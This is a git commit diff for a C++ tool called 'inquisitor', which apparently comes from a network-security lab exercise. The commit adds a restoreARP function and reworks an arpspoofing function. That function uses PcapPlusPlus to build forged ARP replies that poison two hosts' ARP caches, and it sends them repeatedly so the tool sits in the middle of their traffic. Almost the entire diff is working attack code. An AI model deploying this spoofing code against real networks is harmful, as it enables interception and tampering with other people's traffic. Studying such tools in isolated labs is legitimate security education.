058c49a1bc24923535cd0ea8e95b3b890aa8259f
mug4z <mug4z@protonmail.com>
2026-07-10 15:02:12 +0200

    fix(inquisitor): function to restore arp done.

--- inquisitor/main.cpp
+++ inquisitor/main.cpp
@@ -1,4 +1,5 @@
 #include "ArpLayer.h"
+#include "EthLayer.h"
 #include "IpAddress.h"
 #include "MacAddress.h"
 #include "NetworkUtils.h"
@@ -8,8 +9,6 @@
 #include "PcapLiveDevice.h"
 #include "PcapLiveDeviceList.h"
 #include "SystemUtils.h"
-#include "EthLayer.h"
-#include "ArpLayer.h"
 #include <cstdlib>
 #include <getopt.h>
 #include <iostream>
@@ -23,51 +22,97 @@ pcpp::MacAddress getMacAddress(pcpp::IPv4Address addr,
   pcpp::NetworkUtils netUtils = pcpp::NetworkUtils::getInstance();
   return (netUtils.getMacAddress(addr, device, timeinMili));
 }
-// TODO: arpspoofing
-//          IN -> device ,ip_src mac_src ip_target mac_target
-//          OUT -> void
-void arpspoofing(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_vic,
+
+void restoreARP(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
                 pcpp::MacAddress &mac_src, pcpp::IPv4Address &ipv4_target,
                 pcpp::MacAddress &mac_target) {
-  
-  // Create ARP reply for the target
+
+
+  std::cout << "Restore ARP table" << std::endl;
+
+  // Restore target
   pcpp::Packet targetARPReply(500);
-  pcpp::EthLayer targetEthLayer(mac_src, mac_target, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
-  pcpp::ArpLayer targetArplayer(pcpp::ArpReply(mac_src, ipv4_vic, mac_target,ipv4_target));
+  pcpp::EthLayer targetEthLayer(pDevice->getMacAddress(), mac_target,
+                                static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
+  pcpp::ArpLayer targetArplayer(pcpp::ArpReply(mac_src, ipv4_src, mac_target, ipv4_target));
   targetARPReply.addLayer(&targetEthLayer);
   targetARPReply.addLayer(&targetArplayer);
   targetARPReply.computeCalculateFields();
-  
-  // // Create ARP reply for the source
-  //                                 08:00:27:4f:52:12
-  pcpp::MacAddress mac_victim("08:00:27:fc:f8:2b");
+
+  // Restore source
   pcpp::Packet sourceARPReply(500);
-  pcpp::EthLayer sourceEthLayer(mac_src, mac_victim,static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
-  pcpp::ArpLayer sourceARPLayer(pcpp::ArpReply(mac_src,ipv4_target,mac_victim,ipv4_vic));
+  pcpp::EthLayer sourceEthLayer(pDevice->getMacAddress(), mac_src,
+                                static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
+  pcpp::ArpLayer sourceARPLayer(
+      pcpp::ArpReply(mac_target, ipv4_target, mac_src, ipv4_src));
   sourceARPReply.addLayer(&sourceEthLayer);
   sourceARPReply.addLayer(&sourceARPLayer);
   sourceARPLayer.computeCalculateFields();
 
-  while(1){
-    pDevice->sendPacket(&targetARPReply);
-	  std::cout << "Sent ARP reply: " << ipv4_target  << " [target] is at MAC address " << mac_src << " [me]" << std::endl;
-	  pDevice->sendPacket(&sourceARPReply);
-	  std::cout << "Sent ARP reply: " << ipv4_vic << " [source] is at MAC address " << mac_src << " [me]" << std::endl;
-		std::this_thread::sleep_for(std::chrono::seconds(5));
-  }
+  pDevice->sendPacket(&targetARPReply);
+  pDevice->sendPacket(&sourceARPReply);
+}
 
+// TODO: arpspoofing
+//          IN -> device ,ip_src mac_src ip_target mac_target
+//          OUT -> void
+void arpspoofing(pcpp::PcapLiveDevice *pDevice, pcpp::IPv4Address &ipv4_src,
+                 pcpp::MacAddress &mac_src, pcpp::IPv4Address &ipv4_target,
+                 pcpp::MacAddress &mac_target) {
+
+  // Create ARP reply for the target
+  pcpp::Packet targetARPReply(500);
+  pcpp::EthLayer targetEthLayer(pDevice->getMacAddress(), mac_target,
+                                static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
+  pcpp::ArpLayer targetArplayer(pcpp::ArpReply(
+      pDevice->getMacAddress(), ipv4_src, mac_target, ipv4_target));
+  targetARPReply.addLayer(&targetEthLayer);
+  targetARPReply.addLayer(&targetArplayer);
+  targetARPReply.computeCalculateFields();
+
+  // // Create ARP reply for the source
+  //                                 08:00:27:4f:52:12
+  // pcpp::MacAddress mac_victim("08:00:27:fc:f8:2b");
+  pcpp::Packet sourceARPReply(500);
+  pcpp::EthLayer sourceEthLayer(pDevice->getMacAddress(), mac_src,
+                                static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
+  pcpp::ArpLayer sourceARPLayer(
+      pcpp::ArpReply(pDevice->getMacAddress(), ipv4_target, mac_src, ipv4_src));
+  sourceARPReply.addLayer(&sourceEthLayer);
+  sourceARPReply.addLayer(&sourceARPLayer);
+  sourceARPLayer.computeCalculateFields();
+  
+
+  int max = 5 ;
+  int min = 0;
+  while (min < max) {
+    pDevice->sendPacket(&targetARPReply);
+    std::cout << "Sent ARP reply: " << ipv4_target
+              << " [target] is at MAC address " << mac_src << " [me]"
+              << std::endl;
+    pDevice->sendPacket(&sourceARPReply);
+    std::cout << "Sent ARP reply: " << ipv4_src
+              << " [source] is at MAC address " << mac_src << " [me]"
+              << std::endl;
+    std::this_thread::sleep_for(std::chrono::seconds(5));
+    min++;
+  }
+  restoreARP(pDevice, ipv4_src, mac_src, ipv4_target, mac_target);
+  
 }
 int main(int argc, char **argv) {
 
   pcpp::AppName::init(argc, argv);
 
-  if (argc < 6) {
+  if (argc < 5) {
     std::cout << "Not enough arguments" << std::endl;
     exit(1);
   }
 
   std::string ip_src = argv[1], mac_src = argv[2], ip_target = argv[3],
-              mac_target = argv[4], ip_vic = argv[5];
+              mac_target = argv[4];
+
+  pcpp::IPv4Address IPlocal("10.0.2.4");
 
   if (ip_src == "" || mac_src == "" || ip_target == "" || mac_target == "") {
 
@@ -79,11 +124,9 @@ int main(int argc, char **argv) {
   pcpp::MacAddress MAC_source;
   pcpp::IPv4Address IPv4_target;
   pcpp::MacAddress MAC_target;
-  pcpp::IPv4Address IPv4_vic;
 
   try {
 
-    IPv4_vic = pcpp::IPv4Address(ip_vic);
     IPv4_source = pcpp::IPv4Address(ip_src);
 
   } catch (const std::exception &) {
@@ -119,7 +162,7 @@ int main(int argc, char **argv) {
   }
 
   pcpp::PcapLiveDevice *pIfaceDevice =
-      pcpp::PcapLiveDeviceList::getInstance().getDeviceByIp(IPv4_source);
+      pcpp::PcapLiveDeviceList::getInstance().getDeviceByIp(IPlocal);
   std::cout << pIfaceDevice->getName() << std::endl;
 
   if (pIfaceDevice == nullptr) {
@@ -133,7 +176,7 @@ int main(int argc, char **argv) {
     std::cout << "Cannot open interface" << std::endl;
     exit(1);
   }
-  arpspoofing(pIfaceDevice, IPv4_vic, MAC_source, IPv4_target, MAC_target);
+  arpspoofing(pIfaceDevice, IPv4_source, MAC_source, IPv4_target, MAC_target);
 }
 
 // TODO: Create an eth and arplayer
